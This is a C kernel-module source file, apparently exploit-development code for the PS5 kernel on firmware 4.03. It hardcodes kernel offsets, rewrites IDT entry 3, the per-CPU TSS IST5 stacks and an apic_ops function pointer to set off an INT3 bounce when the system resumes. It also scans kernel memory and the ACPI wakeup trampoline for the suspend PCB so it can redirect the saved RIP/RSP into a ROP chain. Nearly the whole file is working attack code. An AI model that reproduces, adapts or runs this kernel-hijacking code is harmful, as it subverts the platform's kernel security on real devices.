#include <stdint.h>

/*
 * analyze_spectre_ps5 — Per-CPU IST bounce + susppcbs finder
 *
 * Two independent approaches to get code execution during LAPIC resume:
 *
 * Approach A (modes 0x01-0x02): Per-CPU IST bounce test
 *   v9a failed with IST=0 (each CPU uses current stack for INT3 trap).
 *   Hypothesis: current stack during LAPIC resume is in a restricted
 *   memory region or too small. Per-CPU IST stacks in kdata bypass this.
 *   Each CPU's TSS gets a UNIQUE IST5 address, eliminating the multi-CPU
 *   race from v3 AND the stack-restriction issue from v9a.
 *
 * Approach B (modes 0x03-0x05): susppcbs hijack path
 *   Find the ACPI suspend PCB (susppcbs[0]) in kdata. This PCB is written
 *   by savectx() during suspend and read by resumectx() during resume.
 *   If we modify it AFTER savectx writes it (via DR watchpoint on pcb_rip),
 *   resumectx loads our patched RIP/RSP → full ROP from resume entry.
 *   No INT3 needed at all.
 *
 * fw_ver encoding:
 *   0x0501: Per-CPU IST bounce — ARM
 *   0x0502: Per-CPU IST bounce — READBACK/RESTORE
 *   0x0503: Compute DMAP base + scan low phys memory for FACS
 *   0x0504: Scan kdata for pointers near cpu_switch (find savectx/resumectx)
 *   0x0505: Given FACS PA, scan ACPI wakeup trampoline for susppcbs
 *
 * Output (288 uint64_t = 2304 bytes):
 *   out[0] = MAGIC (lo32) + status (hi32)
 *   out[1] = kdata_base
 *   out[2] = ktext_base
 *   out[3..] = mode-specific data
 */

#define MAGIC_SPEC       0x53504543  /* "SPEC" */
#define MSR_LSTAR        0xC0000082
#define LSTAR_OFFSET     0x294218

/* FW 4.03 offsets (from ps5-kstuff) */
#define OFF_IDT          0x64cdc80
#define OFF_TSS_ARRAY    0x64d0830
#define TSS_STRIDE       0x68
#define TSS_IST5_OFF     0x44      /* IST5 = TSS + 28 + 5*8 */
#define OFF_APIC_OPS_KTEXT 0x1934AC8  /* apic_ops in ktext segment */
#define OFF_DORETI_IRET  (-0x9cf84c)  /* from kdata_base */
#define OFF_CPU_SWITCH   (-0x9d6f80)  /* from kdata_base */
#define OFF_GPR2DR2      (-0x9d6b87)  /* last known offset in cpu_switch.S */
#define OFF_PMAP_STORE   0x3257a78    /* kernel_pmap_store in kdata */

/* get_timer_freq at ktext+0x294320, CC byte at ktext+0x29431F */
#define GET_TIMER_FREQ_KTEXT 0x294320

#define IDT_ENTRY_SIZE   16
#define TD_PCB           0x3f8
#define PCB_ONFAULT      0x108

#define MAX_CPUS         16
#define IST_STACK_SIZE   0x200
#define READBACK_SLOTS   288

/* Persistence area at kdata+0x2000 (past I/O buffer) */
#define PERSIST_OFF      0x2000

/* IST stack area at kdata+0x4000..0x6000 */
#define IST_STACKS_OFF   0x4000

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t *)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t *)addr = val;
}

static inline uint16_t read2(uint64_t addr)
{
    return *(volatile uint16_t *)addr;
}

static inline void write2(uint64_t addr, uint16_t val)
{
    *(volatile uint16_t *)addr = val;
}

static inline uint8_t read1(uint64_t addr)
{
    return *(volatile uint8_t *)addr;
}

static inline void write1(uint64_t addr, uint8_t val)
{
    *(volatile uint8_t *)addr = val;
}

static inline uint32_t read4(uint64_t addr)
{
    return *(volatile uint32_t *)addr;
}

static inline void write4(uint64_t addr, uint32_t val)
{
    *(volatile uint32_t *)addr = val;
}

static void idt_set_handler(uint64_t idt_entry_addr, uint64_t handler, uint8_t ist)
{
    write2(idt_entry_addr + 0, (uint16_t)(handler & 0xFFFF));
    uint8_t byte4 = read1(idt_entry_addr + 4);
    write1(idt_entry_addr + 4, (byte4 & 0xF8) | (ist & 0x07));
    write2(idt_entry_addr + 6, (uint16_t)((handler >> 16) & 0xFFFF));
    write4(idt_entry_addr + 8, (uint32_t)((handler >> 32) & 0xFFFFFFFF));
}

static uint64_t idt_get_handler(uint64_t idt_entry_addr)
{
    uint16_t lo = read2(idt_entry_addr);
    uint16_t mid = read2(idt_entry_addr + 6);
    uint32_t hi = read4(idt_entry_addr + 8);
    return (uint64_t)lo | ((uint64_t)mid << 16) | ((uint64_t)hi << 32);
}

/*
 * Safe memory read using pcb_onfault.
 * Returns the value at addr, or 0xDEADDEADDEADDEAD on fault.
 * Sets *faulted to 1 on fault, 0 on success.
 * NOTE: kernel clears pcb_onfault after fault, so each call re-arms it.
 */
static uint64_t safe_read8(uint64_t addr, uint64_t onfault_ptr, int *faulted)
{
    uint64_t result;
    int fault = 0;
    __asm__ volatile(
        /* Arm pcb_onfault with recovery label */
        "leaq 2f(%%rip), %%rcx\n\t"
        "movq %%rcx, (%[onfault])\n\t"
        /* Attempt the read */
        "movq (%[addr]), %[result]\n\t"
        /* Success — disarm onfault */
        "movq $0, (%[onfault])\n\t"
        "jmp 1f\n\t"
        /* Fault recovery label */
        "2:\n\t"
        "movabsq $0xDEADDEADDEADDEAD, %[result]\n\t"
        "movl $1, %[fault]\n\t"
        "1:\n\t"
        : [result] "=&r"(result), [fault] "=&rm"(fault)
        : [addr] "r"(addr), [onfault] "r"(onfault_ptr)
        : "rcx", "memory", "cc"
    );
    *faulted = fault;
    return result;
}

/* Safe 4-byte read */
static uint32_t safe_read4(uint64_t addr, uint64_t onfault_ptr, int *faulted)
{
    uint32_t result;
    int fault = 0;
    __asm__ volatile(
        "leaq 2f(%%rip), %%rcx\n\t"
        "movq %%rcx, (%[onfault])\n\t"
        "movl (%[addr]), %[result]\n\t"
        "movq $0, (%[onfault])\n\t"
        "jmp 1f\n\t"
        "2:\n\t"
        "movl $0xDEADDEAD, %[result]\n\t"
        "movl $1, %[fault]\n\t"
        "1:\n\t"
        : [result] "=&r"(result), [fault] "=&rm"(fault)
        : [addr] "r"(addr), [onfault] "r"(onfault_ptr)
        : "rcx", "memory", "cc"
    );
    *faulted = fault;
    return result;
}

int module_start(kproc_args *args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t fw_ver = args->fw_ver;
    volatile uint64_t *out = (volatile uint64_t *)args;
    volatile uint32_t *out32 = (volatile uint32_t *)args;

    uint16_t mode = fw_ver & 0xFFFF;

    /* Compute key addresses */
    uint64_t lstar = rdmsr(MSR_LSTAR);
    uint64_t ktext_base = lstar - LSTAR_OFFSET;
    uint64_t idt_base = kdata_base + OFF_IDT;
    uint64_t tss_base = kdata_base + OFF_TSS_ARRAY;
    uint64_t doreti_iret = kdata_base + (int64_t)OFF_DORETI_IRET;
    uint64_t get_timer_freq = ktext_base + GET_TIMER_FREQ_KTEXT;
    uint64_t cc_target = get_timer_freq - 1;
    uint64_t cpu_switch = kdata_base + (int64_t)OFF_CPU_SWITCH;

    /* Persistence area */
    volatile uint64_t *persist = (volatile uint64_t *)(kdata_base + PERSIST_OFF);

    /* Clear output */
    for (int i = 0; i < READBACK_SLOTS; i++)
        out[i] = 0;

    out[1] = kdata_base;
    out[2] = ktext_base;

    /* Get curthread → td_pcb for onfault */
    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t td_pcb = read8(curthread + TD_PCB);
    uint64_t onfault_ptr = td_pcb ? (td_pcb + PCB_ONFAULT) : 0;

    switch (mode) {

    case 0x0501: {
        /*
         * Per-CPU IST bounce — ARM
         *
         * Fix for v9a failure: each CPU gets its own IST5 stack.
         * v9a used IST=0 (current stack), which might be too small or
         * in restricted memory during LAPIC resume. Per-CPU IST stacks
         * in kdata avoid both the multi-CPU race (v3) and the
         * current-stack restriction (v9a).
         *
         * Setup:
         *   IDT[3] handler = doreti_iret, IST = 5
         *   TSS[cpu].IST5 = kdata + IST_STACKS_OFF + (cpu+1)*IST_STACK_SIZE
         *   apic_ops[2] = get_timer_freq - 1 (CC byte, confirmed)
         *
         * Expected resume flow:
         *   call *apic_ops[2] → CC byte → INT3
         *   → CPU loads RSP from this CPU's TSS IST5 (per-CPU stack!)
         *   → pushes SS, RSP, RFLAGS, CS, RIP (= get_timer_freq)
         *   → IDT[3] handler = doreti_iret → iretq
         *   → pops everything back → get_timer_freq executes
         *   → returns 0x13b0 → LAPIC caller continues
         */

        uint64_t idt3_addr = idt_base + 3 * IDT_ENTRY_SIZE;
        uint64_t apic_ops_2_addr = ktext_base + OFF_APIC_OPS_KTEXT + 2 * 8;

        /* Save originals to persistence area */
        persist[0] = 0x5043495354303100ULL;  /* "PCIST01\0" */
        persist[1] = read8(idt3_addr);       /* original IDT[3] lo */
        persist[2] = read8(idt3_addr + 8);   /* original IDT[3] hi */
        persist[3] = read8(apic_ops_2_addr); /* original apic_ops[2] */

        out[3] = persist[1];
        out[4] = persist[2];
        out[5] = persist[3];

        /* Detect CPU count: scan TSS entries for non-zero RSP0 */
        int num_cpus = 0;
        for (int i = 0; i < MAX_CPUS; i++) {
            uint64_t tss_cpu = tss_base + (uint64_t)i * TSS_STRIDE;
            uint64_t rsp0 = read8(tss_cpu + 4);
            if (rsp0 != 0)
                num_cpus = i + 1;
        }
        if (num_cpus == 0)
            num_cpus = 8;
        persist[20] = num_cpus;
        out[6] = num_cpus;

        /* Per-CPU IST setup */
        uint64_t ist_base = kdata_base + IST_STACKS_OFF;

        for (int i = 0; i < num_cpus; i++) {
            uint64_t tss_cpu = tss_base + (uint64_t)i * TSS_STRIDE;
            uint64_t ist5_addr = tss_cpu + TSS_IST5_OFF;

            /* Save original IST5 */
            persist[4 + i] = read8(ist5_addr);

            /* Stack top for this CPU (stack grows down) */
            uint64_t stack_top = ist_base + (uint64_t)(i + 1) * IST_STACK_SIZE;

            /* Fill stack with canary pattern */
            for (int j = 0; j < IST_STACK_SIZE / 8; j++) {
                write8(ist_base + (uint64_t)i * IST_STACK_SIZE + (uint64_t)j * 8,
                       0xDEAD000000000000ULL | ((uint64_t)i << 8) | (uint64_t)j);
            }

            /* Set IST5 = this CPU's stack top */
            write8(ist5_addr, stack_top);

            /* Report (2 slots per CPU: original IST5, new IST5) */
            if (i < 8) {
                out[8 + i * 2] = persist[4 + i];
                out[8 + i * 2 + 1] = stack_top;
            }
        }

        /* Set IDT[3] handler = doreti_iret, IST = 5 */
        idt_set_handler(idt3_addr, doreti_iret, 5);
        out[24] = doreti_iret;
        out[25] = idt_get_handler(idt3_addr);

        /* Set apic_ops[2] = CC byte */
        write8(apic_ops_2_addr, cc_target);
        out[26] = cc_target;
        out[27] = read8(apic_ops_2_addr);

        /* Sentinel */
        persist[21] = 0xDEAD1D7ACC050100ULL;
        out[28] = persist[21];

        /* Debug addresses */
        out[29] = idt3_addr;
        out[30] = apic_ops_2_addr;
        out[31] = ist_base;
        out[32] = tss_base;
        out[33] = get_timer_freq;

        __asm__ volatile("mfence" ::: "memory");
        out32[1] = 0x0501;
        out32[0] = MAGIC_SPEC;
        break;
    }

    case 0x0502: {
        /*
         * Per-CPU IST bounce — READBACK/RESTORE
         *
         * After resume (or if system never suspended), checks state
         * and restores all originals so kldload works normally.
         */

        uint64_t idt3_addr = idt_base + 3 * IDT_ENTRY_SIZE;
        uint64_t apic_ops_2_addr = ktext_base + OFF_APIC_OPS_KTEXT + 2 * 8;

        /* Check persistence */
        out[3] = persist[0];   /* ARM marker */
        out[4] = persist[21];  /* sentinel */

        int num_cpus = (int)persist[20];
        if (num_cpus <= 0 || num_cpus > MAX_CPUS)
            num_cpus = 8;
        out[5] = num_cpus;

        /* Current IDT[3] */
        out[6] = read8(idt3_addr);
        out[7] = read8(idt3_addr + 8);
        uint64_t cur_handler = idt_get_handler(idt3_addr);
        out[8] = cur_handler;
        out[9] = (cur_handler == doreti_iret) ? 0x50455253ULL : 0; /* "PERS" if match */

        /* Current apic_ops[2] */
        uint64_t cur_apic = read8(apic_ops_2_addr);
        out[10] = cur_apic;
        out[11] = cc_target;
        out[12] = (cur_apic == cc_target) ? 0x50455253ULL : 0;

        /* Read per-CPU IST stacks for trap frame evidence */
        uint64_t ist_base = kdata_base + IST_STACKS_OFF;

        for (int i = 0; i < num_cpus && i < 8; i++) {
            uint64_t stack_top = ist_base + (uint64_t)(i + 1) * IST_STACK_SIZE;

            /*
             * INT3 through interrupt gate pushes (in order, growing down):
             *   [stack_top - 8]  = SS
             *   [stack_top - 16] = RSP (original)
             *   [stack_top - 24] = RFLAGS
             *   [stack_top - 32] = CS
             *   [stack_top - 40] = RIP (= get_timer_freq, after INT3 advances past CC)
             *
             * If doreti_iret consumed the frame (iretq), these values were
             * POP'd and the stack should still have them written (pop doesn't
             * erase, it just moves RSP). If the bounce never fired, we see
             * the DEAD canary pattern.
             */
            uint64_t tf_ss     = read8(stack_top - 8);
            uint64_t tf_rsp    = read8(stack_top - 16);
            uint64_t tf_rflags = read8(stack_top - 24);
            uint64_t tf_cs     = read8(stack_top - 32);
            uint64_t tf_rip    = read8(stack_top - 40);

            /* Is this a real trap frame or canary? */
            int is_trapframe = ((tf_cs & 0xFFFF) == 0x20) &&
                               (tf_rip >= ktext_base) &&
                               (tf_rip < ktext_base + 0xC00000);

            /* Pack: 5 slots per CPU starting at out[20] */
            out[20 + i * 5]     = tf_rip;
            out[20 + i * 5 + 1] = tf_cs;
            out[20 + i * 5 + 2] = tf_rflags;
            out[20 + i * 5 + 3] = tf_rsp;
            out[20 + i * 5 + 4] = is_trapframe ? 0xCC00CC00ULL : tf_ss;
        }

        /* Read current TSS IST5 values (did they persist?) */
        for (int i = 0; i < num_cpus && i < 8; i++) {
            uint64_t tss_cpu = tss_base + (uint64_t)i * TSS_STRIDE;
            out[68 + i] = read8(tss_cpu + TSS_IST5_OFF);
        }

        /* === RESTORE ALL ORIGINALS === */

        /* Restore IDT[3] */
        write8(idt3_addr, persist[1]);
        write8(idt3_addr + 8, persist[2]);
        out[80] = idt_get_handler(idt3_addr);

        /* Restore apic_ops[2] */
        write8(apic_ops_2_addr, persist[3]);
        out[81] = read8(apic_ops_2_addr);

        /* Restore TSS IST5 for each CPU */
        for (int i = 0; i < num_cpus; i++) {
            uint64_t tss_cpu = tss_base + (uint64_t)i * TSS_STRIDE;
            write8(tss_cpu + TSS_IST5_OFF, persist[4 + i]);
        }
        out[82] = 0x524553544F524544ULL; /* "RESTORED" */

        __asm__ volatile("mfence" ::: "memory");
        out32[1] = 0x0502;
        out32[0] = MAGIC_SPEC;
        break;
    }

    case 0x0503: {
        /*
         * DMAP base + FACS scan
         *
         * Computes DMAP base from CR3 and kernel_pmap_store.
         * Scans low physical memory (via DMAP) for ACPI FACS table.
         * Reports FACS address and firmware waking vector (points to
         * the ACPI wakeup trampoline that calls resumectx(susppcbs[0])).
         */

        if (!onfault_ptr) {
            out32[1] = 0x05FF;
            out32[0] = MAGIC_SPEC;
            break;
        }

        /* Read CR3 */
        uint64_t cr3;
        __asm__ volatile("movq %%cr3, %0" : "=r"(cr3));
        out[3] = cr3;

        /* Read kernel_pmap_store to find pm_pml4 */
        uint64_t pmap_addr = kdata_base + OFF_PMAP_STORE;
        uint64_t dmap_base = 0;

        /* Try first few qwords of pmap struct for pm_pml4 */
        for (int off = 0; off < 5; off++) {
            uint64_t candidate = read8(pmap_addr + off * 8);
            out[4 + off] = candidate;
            if (dmap_base == 0 && (candidate >> 40) == 0xFFFF && candidate > cr3) {
                /* Looks like a DMAP virtual address */
                uint64_t test_base = candidate - cr3;
                /* Verify: DMAP base should be page-aligned */
                if ((test_base & 0xFFF) == 0) {
                    dmap_base = test_base;
                    out[9] = off;  /* which pmap offset worked */
                }
            }
        }

        out[10] = dmap_base;

        if (dmap_base == 0) {
            out32[1] = 0x05F3;
            out32[0] = MAGIC_SPEC;
            break;
        }

        /* Scan for FACS signature in BIOS area (0xE0000-0x100000) */
        uint64_t facs_pa = 0;
        int facs_found = 0;
        int scan_count = 0;

        /* First scan BIOS area */
        for (uint64_t pa = 0xE0000; pa < 0x100000 && !facs_found; pa += 16) {
            int faulted;
            uint32_t sig = safe_read4(dmap_base + pa, onfault_ptr, &faulted);
            scan_count++;
            if (!faulted && sig == 0x53434146) {  /* "FACS" little-endian */
                facs_pa = pa;
                facs_found = 1;
            }
        }

        /* If not found, scan conventional memory (0x00000-0xA0000) */
        if (!facs_found) {
            for (uint64_t pa = 0; pa < 0xA0000 && !facs_found; pa += 16) {
                int faulted;
                uint32_t sig = safe_read4(dmap_base + pa, onfault_ptr, &faulted);
                scan_count++;
                if (!faulted && sig == 0x53434146) {
                    facs_pa = pa;
                    facs_found = 1;
                }
            }
        }

        /* Also check if ACPI tables are in higher memory */
        if (!facs_found) {
            /* Try scanning 0x100000 to 0x200000 */
            for (uint64_t pa = 0x100000; pa < 0x200000 && !facs_found; pa += 16) {
                int faulted;
                uint32_t sig = safe_read4(dmap_base + pa, onfault_ptr, &faulted);
                scan_count++;
                if (!faulted && sig == 0x53434146) {
                    facs_pa = pa;
                    facs_found = 1;
                }
            }
        }

        out[11] = facs_found;
        out[12] = facs_pa;
        out[13] = scan_count;

        if (facs_found) {
            uint64_t facs_va = dmap_base + facs_pa;

            /* Dump first 64 bytes of FACS */
            for (int i = 0; i < 8; i++) {
                int faulted;
                out[14 + i] = safe_read8(facs_va + i * 8, onfault_ptr, &faulted);
            }

            /*
             * FACS layout:
             *   +0:  signature "FACS" (4 bytes)
             *   +4:  length (4 bytes)
             *   +12: firmware_waking_vector (4 bytes, 32-bit PA)
             *   +16: global_lock (4 bytes)
             *   +24: x_firmware_waking_vector (8 bytes, 64-bit PA)
             *   +32: version (1 byte)
             */
            int f;
            uint32_t waking_vec_32 = safe_read4(facs_va + 12, onfault_ptr, &f);
            uint64_t waking_vec_64 = safe_read8(facs_va + 24, onfault_ptr, &f);
            out[22] = waking_vec_32;
            out[23] = waking_vec_64;

            /* Use whichever waking vector is set */
            uint64_t wakeup_pa = waking_vec_64 ? waking_vec_64 : (uint64_t)waking_vec_32;
            out[24] = wakeup_pa;

            if (wakeup_pa) {
                /* Scan wakeup trampoline page for kernel virtual addresses */
                uint64_t wakeup_va = dmap_base + wakeup_pa;
                int addr_count = 0;

                /* Dump first 512 bytes of wakeup trampoline */
                for (int i = 0; i < 64 && i < 50; i++) {
                    uint64_t val = safe_read8(wakeup_va + i * 8, onfault_ptr, &f);
                    /* Look for kernel virtual addresses (0xffffff80... or 0xffffffff...) */
                    if ((val >> 40) == 0xFFFF && val != 0xFFFFFFFFFFFFFFFFULL) {
                        if (addr_count < 30) {
                            out[30 + addr_count * 2] = (uint64_t)(i * 8);  /* offset in trampoline */
                            out[30 + addr_count * 2 + 1] = val;            /* the address */
                            addr_count++;
                        }
                    }
                }
                out[25] = addr_count;

                /* Also dump first 256 bytes raw for manual analysis */
                for (int i = 0; i < 32; i++) {
                    out[100 + i] = safe_read8(wakeup_va + i * 8, onfault_ptr, &f);
                }
            }
        }

        __asm__ volatile("mfence" ::: "memory");
        out32[1] = 0x0503;
        out32[0] = MAGIC_SPEC;
        break;
    }

    case 0x0504: {
        /*
         * Scan kdata for pointers near cpu_switch
         *
         * Scans kdata looking for 8-byte values that fall in the range
         * [cpu_switch, cpu_switch + 0x2000]. This range covers:
         *   cpu_switch:     -0x9d6f80  (offset 0)
         *   dr2gpr_start:   -0x9d6d93  (+0x1ED)
         *   gpr2dr_1_start: -0x9d6c7a  (+0x306)
         *   gpr2dr_2_start: -0x9d6b87  (+0x3F9)
         *   ... savectx and resumectx should be further ...
         *
         * Uses fw_ver high byte for batch:
         *   fw_ver = 0x0504 | (batch << 24)
         *   batch 0: kdata+0x00000 to kdata+0x40000  (256KB)
         *   batch 1: kdata+0x40000 to kdata+0x80000
         *   ...
         *   batch N: kdata+N*0x40000 to kdata+(N+1)*0x40000
         *
         * Practical: scan first 4MB (batches 0-15) to cover common
         * kdata regions. susppcbs/ACPI data is typically in this range.
         */

        int batch = (fw_ver >> 24) & 0xFF;
        uint64_t scan_start = kdata_base + (uint64_t)batch * 0x40000;
        uint64_t scan_end = scan_start + 0x40000;
        uint64_t range_lo = cpu_switch;
        uint64_t range_hi = cpu_switch + 0x2000;

        out[3] = batch;
        out[4] = scan_start;
        out[5] = scan_end;
        out[6] = range_lo;
        out[7] = range_hi;
        out[8] = cpu_switch;

        int match_count = 0;
        uint64_t words_scanned = 0;

        for (uint64_t addr = scan_start; addr < scan_end; addr += 8) {
            uint64_t val = read8(addr);
            words_scanned++;

            if (val >= range_lo && val < range_hi) {
                if (match_count < 60) {
                    /* Store match: offset from kdata_base, value, distance from cpu_switch */
                    out[10 + match_count * 3] = addr - kdata_base;
                    out[10 + match_count * 3 + 1] = val;
                    out[10 + match_count * 3 + 2] = val - cpu_switch;
                }
                match_count++;
            }
        }

        out[9] = match_count;

        /* Also report known cpu_switch.S offsets for reference */
        out[200] = (uint64_t)(int64_t)OFF_CPU_SWITCH;    /* cpu_switch offset */
        out[201] = (uint64_t)(int64_t)OFF_GPR2DR2;       /* gpr2dr_2 offset */
        out[202] = (uint64_t)(int64_t)OFF_DORETI_IRET;   /* doreti_iret offset */
        out[203] = words_scanned;

        __asm__ volatile("mfence" ::: "memory");
        out32[1] = 0x0504;
        out32[0] = MAGIC_SPEC;
        break;
    }

    case 0x0505: {
        /*
         * Scan kdata for PCB-like structures (susppcbs finder)
         *
         * Looks for kdata pointers that, when dereferenced twice, reveal
         * a structure with:
         *   +0x38 (pcb_rip) = ktext address
         *   +0x68 (pcb_cr3) = non-zero (savectx saved it, unlike cpu_switch)
         *
         * This distinguishes the suspend PCB from regular thread PCBs
         * (which have zero CR3 because cpu_switch doesn't save CRs).
         *
         * fw_ver = 0x0505 | (batch << 24)
         * Scans kdata + batch*0x40000 to kdata + (batch+1)*0x40000
         *
         * NOTE: System must have completed at least one rest mode cycle
         * for susppcbs[0] to contain non-zero values from savectx.
         */

        if (!onfault_ptr) {
            out32[1] = 0x05FF;
            out32[0] = MAGIC_SPEC;
            break;
        }

        int batch = (fw_ver >> 24) & 0xFF;
        uint64_t scan_start = kdata_base + (uint64_t)batch * 0x40000;
        uint64_t scan_end = scan_start + 0x40000;

        out[3] = batch;
        out[4] = scan_start;
        out[5] = scan_end;

        /* Write magic EARLY for crash-safe readback */
        out32[1] = 0x0105;  /* in-progress */
        __asm__ volatile("mfence" ::: "memory");
        out32[0] = MAGIC_SPEC;

        int candidate_count = 0;
        uint64_t words_scanned = 0;
        int faults = 0;

        for (uint64_t addr = scan_start; addr < scan_end; addr += 8) {
            uint64_t val = read8(addr);
            words_scanned++;

            /* Filter: must look like a kernel heap pointer (0xffffff80...) */
            if ((val >> 32) != 0xffffff80 && (val >> 32) != 0xffffffff)
                continue;
            if (val == 0xffffffffffffffffULL)
                continue;

            /* Level 1: val might be susppcbs (pointer to PCB pointer array) */
            /* OR val might directly be a PCB pointer */
            /* Try val as direct PCB pointer first */
            int f1, f2;
            uint64_t pcb_rip = safe_read8(val + 0x38, onfault_ptr, &f1);
            if (f1) { faults++; continue; }

            /* pcb_rip must be in ktext range */
            if (pcb_rip < ktext_base || pcb_rip >= ktext_base + 0xC00000)
                continue;

            /* pcb_cr3 must be non-zero (savectx saves CR3, cpu_switch doesn't) */
            uint64_t pcb_cr3 = safe_read8(val + 0x68, onfault_ptr, &f2);
            if (f2) { faults++; continue; }
            if (pcb_cr3 == 0)
                continue;

            /* Found a candidate! */
            if (candidate_count < 20) {
                int base = 10 + candidate_count * 6;
                out[base]     = addr - kdata_base;  /* kdata offset where pointer was found */
                out[base + 1] = val;                /* the pointer value (PCB address) */
                out[base + 2] = pcb_rip;            /* pcb_rip (ktext address) */
                out[base + 3] = pcb_cr3;            /* pcb_cr3 (non-zero = suspend PCB) */

                /* Also read pcb_rsp and pcb_cr0 */
                uint64_t pcb_rsp = safe_read8(val + 0x28, onfault_ptr, &f1);
                uint64_t pcb_cr0 = safe_read8(val + 0x58, onfault_ptr, &f2);
                out[base + 4] = pcb_rsp;
                out[base + 5] = pcb_cr0;
            }
            candidate_count++;
        }

        out[6] = candidate_count;
        out[7] = words_scanned;
        out[8] = faults;
        out[9] = ktext_base;

        __asm__ volatile("mfence" ::: "memory");
        out32[1] = 0x0505;
        out32[0] = MAGIC_SPEC;
        break;
    }

    default:
        out[3] = fw_ver;
        out32[1] = 0x00FD;
        __asm__ volatile("mfence" ::: "memory");
        out32[0] = MAGIC_SPEC;
        break;
    }

    return 0;
}
